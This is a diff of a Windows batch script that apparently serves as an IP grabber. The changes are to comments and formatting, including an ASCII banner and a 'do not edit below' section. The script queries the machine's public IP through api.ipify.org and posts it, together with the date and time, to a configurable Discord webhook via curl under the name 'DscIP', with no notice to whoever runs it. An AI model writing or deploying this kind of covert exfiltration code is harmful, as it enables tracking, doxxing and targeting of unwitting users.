@@ -1,11 +1,11 @@
 @echo off
 
-
-
-
-Rem Setting
+REM "█▀▄ █ █▀ █▀▀ █▀█ █ █▀█"
+REM "█▄▀ █ ▄█ █▄▄ █▄█ █ █▀▀"
+Rem ----------------------------------------------------------- Setting --------------------------------------------------
 SET WEBHOOK_URL=webhooklink
 SET Provide_additional_information=TRUE
+Rem ----------------------------------------------------------------------------------------------------------------------
 
 
 
@@ -55,14 +55,25 @@ SET Provide_additional_information=TRUE
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+REM ----------------------------------------------------- Please do not edit below ------------------------------------------
 
 Rem PublicIP
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
-
-
-
-
-
 
 Rem T/F Check
 if %Provide_additional_information%==TRUE goto O
@@ -72,17 +83,11 @@ curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content
 Rem Error 1
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```wrong value```\"}" %WEBHOOK_URL%
 goto quit
-
-
-
 Rem hook(x)
 :X
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```IP : %PublicIP% ```\"}" %WEBHOOK_URL%
 goto quit
-
-
-
 Rem hook(O)
 :O
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
@@ -92,12 +97,5 @@ curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Time Infrom [ Date,Time : %date% %time% ]```\"}" %WEBHOOK_URL%
 curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```---------------------------------------------------------------------------```\"}" %WEBHOOK_URL%
 goto quit
-
-
-
-
-
-
-
-
 :quit
+REM ------------------------------------------------------- Code End ----------------------------------------------------
